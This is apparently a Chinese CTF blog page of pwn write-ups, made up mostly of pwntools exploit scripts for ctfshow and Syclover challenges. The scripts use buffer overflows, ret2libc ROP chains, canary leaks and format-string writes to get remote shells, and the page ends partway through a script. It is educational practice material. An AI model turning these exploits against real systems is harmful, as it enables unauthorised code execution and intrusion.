<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;....&#x27;</span>,<span class="number">58343</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;age:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;key:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a@a:~/tools$ nc localhost <span class="number">58495</span></span><br><span class="line">Please <span class="built_in">input</span> your name:</span><br><span class="line">aaaaaaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">Your name <span class="keyword">is</span>: aaaaaaaaaaaa<span class="number">.0</span>xffbfeb7c<span class="number">.0</span>x50<span class="number">.0</span>x5663c362<span class="number">.0</span>xffbfeca4.(nil)<span class="number">.0</span>x3<span class="number">.0</span>x63656f6d<span class="number">.0</span>x6b7b6674<span class="number">.0</span>x37375254<span class="number">.0</span>x5a5a7268<span class="number">.0</span>x5a346d64<span class="number">.0</span>x44337530<span class="number">.0</span>x78786e2d<span class="number">.0</span>x42566d59<span class="number">.0</span>x77497752<span class="number">.0</span>x7d65596f<span class="number">.0</span>xa.(nil).(nil).(nil).(nil).(nil).</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这些数据，将这些数据提取出来，然后去解码就能拿到flag，我们借用一个脚本一键做到</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;....&#x27;,58343)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">17</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;10.241.180.67&#x27;</span>,<span class="number">58495</span>)</span><br><span class="line">    p.sendline(<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line">    byte_str = binascii.unhexlify(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    str_result = byte_str.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    flag+=str_result[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h2><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>模板套题，有点小问题是他用ubuntu22.04打不通，但用18.04可以打通</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;10.241.180.67&#x27;</span>,<span class="number">62836</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040117e</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006e1</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span>+<span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment">#将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，</span></span><br><span class="line"><span class="comment"># leak = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>) </span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload2 = (<span class="number">0x50</span>+<span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h3 id="pwn（03）"><a href="#pwn（03）" class="headerlink" title="pwn（03）"></a>pwn（03）</h3><p>分析源码，没有发现binsh字符串以及system函数，且开启了nx保护，看到pwnme（）函数中存在栈溢出，所以可以使用libc，具体思路为先泄露puts函数的真实地址，然后使用puts的真实地址确实libc版本，使用libcsearcher确定偏移等，最后或许shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28109)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./stack1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./stack1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*13 + p32(plt_addr) + p32(main_addr) + p32(got_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;\n\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(&quot;puts&quot;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*13 + p32(system_addr) + b&#x27;aaaa&#x27; +p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://uploader.shimo.im/f/ugqnlZvDfD07Ok7r.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
<h3 id="pwn-4"><a href="#pwn-4" class="headerlink" title="pwn(4)"></a>pwn(4)</h3><p>格式化字符串，难一点的做法</p>
<p>&#96;<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39980610/article/details/126461902">ctfshow pwn4_ctfshow pwn04_whit233的博客-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28106)</span><br><span class="line"># p = process(&#x27;ex2 (1)&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = 0x080485AF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = &#x27;%31$x&#x27;</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">canary = int(p.recv(8),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn（6）"><a href="#pwn（6）" class="headerlink" title="pwn（6）"></a>pwn（6）</h3><p>简单的栈溢出，主要练习64位的题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28110)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = 0x000000000040057B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400643</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*20 + p64(pop_rdi) + p64(system_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://uploader.shimo.im/f/xp4GMcBPmsv4tHpE.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
<h3 id="pwn（7）"><a href="#pwn（7）" class="headerlink" title="pwn（7）"></a>pwn（7）</h3><p>64位版的pwn（3），改一些数值就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28112)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./stack1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004006e3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = 0x00000000004006e1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*20 + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) #将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(&quot;puts&quot;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret_addr = 0x00000000004004c6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*20 + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://uploader.shimo.im/f/LoBqZZI5JKEsHZTF.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
<h3 id="pwn（10）"><a href="#pwn（10）" class="headerlink" title="pwn（10）"></a>pwn（10）</h3><p>经典格式化字符串题目</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/anweilx/p/12693406.html">ctfshow—pwn10 - anweilx - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28104)</span><br><span class="line">#p = process(&quot;./pwn1&quot;)</span><br><span class="line">num_addr = 0x0804A030</span><br><span class="line">payload = p32(num_addr)+b&quot;aaaaaaaaaaaa%7$n&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://uploader.shimo.im/f/Ou6kePLwJWx3nIue.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-奇怪的wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/10/08/%E5%A5%87%E6%80%AA%E7%9A%84wp/" class="article-date">
  	<time datetime="2023-10-08T13:14:04.000Z" itemprop="datePublished">2023-10-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/10/08/%E5%A5%87%E6%80%AA%E7%9A%84wp/">
        奇怪的wp
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;my heart&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaSyclover&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;challege!&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">a=p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">a = a[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="number">6666666666</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">r = <span class="built_in">eval</span>(a)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>PIE手动爆破,填充数据不是0x50</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># r = gdb.debug(&#x27;./ret2text&#x27;)</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31949</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&#x27;ret2text&#x27;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span 